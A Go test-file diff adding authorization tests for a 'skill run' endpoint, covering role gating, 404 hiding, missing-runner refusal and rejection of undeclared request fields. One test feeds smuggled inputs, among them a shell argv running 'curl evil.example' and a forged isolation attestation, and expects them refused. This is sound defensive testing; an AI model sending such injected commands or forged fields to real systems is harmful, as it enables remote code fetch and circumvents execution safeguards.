@@ -530,3 +530,93 @@ type presentInspector struct{}
 func (presentInspector) VerifyImagePresent(_ context.Context, digest string) (string, error) {
 	return digest, nil
 }
+
+// The execution route, and the line between reading and acting.
+//
+// A dry run is a read: it reports what WOULD happen and a viewer may do it.
+// This route makes it happen, so it is gated on project.manage. The two must
+// never collapse into one call with a flag — that is how a read becomes an
+// execution by editing one field.
+func TestSkillRun_IsGatedOnManageNotRead(t *testing.T) {
+	w := newSkillsWorld(t)
+	ownerCookie := w.login("owner")
+	version := w.installAsOwner(ownerCookie)
+	w.expect(http.MethodPut, "/api/v1/projects/medusa/skills/security-audit", ownerCookie,
+		`{"version":"`+version+`","capabilities":["repo.read","report.write"]}`, http.StatusOK)
+
+	w.grantProjectRole(w.viewer, "medusa", domain.ProjectRoleViewer)
+	viewerCookie := w.login("viewer")
+
+	// The viewer may ask what would happen...
+	w.expect(http.MethodPost, "/api/v1/projects/medusa/skills/security-audit/dry-run", viewerCookie,
+		`{"modeId":"static-code","inputs":{"mode":"static-code"}}`, http.StatusOK)
+	// ...and may not make it happen.
+	w.expect(http.MethodPost, "/api/v1/projects/medusa/skills/security-audit/run", viewerCookie,
+		`{"modeId":"static-code","inputs":{"mode":"static-code"}}`, http.StatusForbidden)
+}
+
+// A project the caller cannot see at all stays a 404 on the run route too. The
+// 403/404 split is the same one every project-scoped route uses, and an
+// execution route that leaked existence would be the worst place to break it.
+func TestSkillRun_HidesAProjectTheCallerCannotSee(t *testing.T) {
+	w := newSkillsWorld(t)
+	ownerCookie := w.login("owner")
+	version := w.installAsOwner(ownerCookie)
+	w.expect(http.MethodPut, "/api/v1/projects/medusa/skills/security-audit", ownerCookie,
+		`{"version":"`+version+`","capabilities":["repo.read","report.write"]}`, http.StatusOK)
+
+	// The viewer has no role on medusa at all.
+	viewerCookie := w.login("viewer")
+	w.expect(http.MethodPost, "/api/v1/projects/medusa/skills/security-audit/run", viewerCookie,
+		`{"modeId":"static-code","inputs":{"mode":"static-code"}}`, http.StatusNotFound)
+}
+
+// With the permission but no execution environment, the run is refused and the
+// refusal NAMES what is missing. This harness wires no executor, which is the
+// same shape as a host with no container runtime — the state most installations
+// are in — and it must not read as "the skill failed".
+func TestSkillRun_RefusesWithoutARunnerAndSaysWhy(t *testing.T) {
+	w := newSkillsWorld(t)
+	ownerCookie := w.login("owner")
+	version := w.installAsOwner(ownerCookie)
+	w.expect(http.MethodPut, "/api/v1/projects/medusa/skills/security-audit", ownerCookie,
+		`{"version":"`+version+`","capabilities":["repo.read","report.write"]}`, http.StatusOK)
+
+	body := w.expect(http.MethodPost, "/api/v1/projects/medusa/skills/security-audit/run", ownerCookie,
+		`{"modeId":"static-code","inputs":{"mode":"static-code"}}`, http.StatusConflict)
+	if !strings.Contains(body, "SKILL_RUNNER_UNAVAILABLE") {
+		t.Fatalf("the refusal must name the missing environment; got: %s", body)
+	}
+}
+
+// A skill that is installed but NOT enabled on this project cannot be run, even
+// by an owner. Installing is an installation decision; activating is a project
+// one, and the run needs both.
+func TestSkillRun_RefusesASkillThisProjectHasNotEnabled(t *testing.T) {
+	w := newSkillsWorld(t)
+	ownerCookie := w.login("owner")
+	w.installAsOwner(ownerCookie)
+
+	w.expect(http.MethodPost, "/api/v1/projects/medusa/skills/security-audit/run", ownerCookie,
+		`{"modeId":"static-code","inputs":{"mode":"static-code"}}`, http.StatusNotFound)
+}
+
+// The caller contributes no command. An unknown field in the body is refused
+// outright rather than ignored, so a client cannot start smuggling one in and
+// discover later that AO was quietly dropping it.
+func TestSkillRun_RefusesAnythingItDoesNotDeclare(t *testing.T) {
+	w := newSkillsWorld(t)
+	ownerCookie := w.login("owner")
+	version := w.installAsOwner(ownerCookie)
+	w.expect(http.MethodPut, "/api/v1/projects/medusa/skills/security-audit", ownerCookie,
+		`{"version":"`+version+`","capabilities":["repo.read","report.write"]}`, http.StatusOK)
+
+	for _, body := range []string{
+		`{"modeId":"static-code","image":"alpine:latest"}`,
+		`{"modeId":"static-code","argv":["sh","-c","curl evil.example"]}`,
+		`{"modeId":"static-code","attestation":{"isolated":true,"egressControlled":true}}`,
+	} {
+		w.expect(http.MethodPost, "/api/v1/projects/medusa/skills/security-audit/run", ownerCookie,
+			body, http.StatusBadRequest)
+	}
+}
